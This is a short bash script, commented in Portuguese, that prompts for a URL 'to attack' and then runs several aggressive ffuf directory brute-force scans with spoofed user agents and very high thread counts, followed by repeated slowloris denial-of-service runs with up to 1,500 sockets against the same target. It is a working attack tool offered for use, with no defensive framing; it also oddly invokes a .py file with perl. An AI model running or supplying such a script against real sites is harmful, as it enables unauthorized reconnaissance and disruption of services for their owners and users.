#!/bin/bash
#Script para Realizar Enumeração
clear
echo -n "Qual o Endereço da URL que  Deseja Atacar :"
read URL

sudo ffuf -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) *HOT GET* (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36" -t 350 -w /usr/share/wordlists/dirb/big.txt -u https://$URL/FUZZ -mc 200 -v && sudo ffuf -H "User-Agent: Mozilla/5.0 (****Mozilla/7.3***) " -t 450 -w /usr/share/wordlists/dirb/big.txt -u https://$URL/FUZZ -mc 200 -v && sudo ffuf -H "User-Agent: Mozilla/5.0 (****Iphone 14.4 - Safari/7.3***) " -t 350 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u $URL/FUZZ -t 900 -ac -c && sudo ffuf -H "User-Agent: Mozilla/5.0 (****Iphone 14.4 - Safari/7.3***) " -t 350 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://$URL/FUZZ -t 900 -ac -c && seq 1 5000 | sudo ffuf -u https://$URL/FUZZ -w /usr/share/wordlists/dirb/big.txt 



sudo perl slowloris.py -v $URL -s 500 -ua --sleeptime 1; sudo perl slowloris.py -v $URL -s 500 -ua --sleeptime 1; sudo perl slowloris.py -v $URL -s 1500 -ua --sleeptime 1; sudo perl slowloris.py -v $URL -s 1500 -ua --sleeptime 1; 











































